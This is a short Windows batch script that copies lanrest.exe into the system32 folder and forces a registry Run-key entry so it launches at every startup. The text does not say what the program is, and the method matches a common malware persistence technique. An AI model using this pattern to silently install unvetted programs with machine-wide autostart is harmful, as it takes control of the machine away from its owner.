@echo off
copy lanrest.exe "C:\Windows\system32\lanrest.exe"
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Lanrest /t REG_SZ /d "C:\Windows\system32\lanrest.exe" /f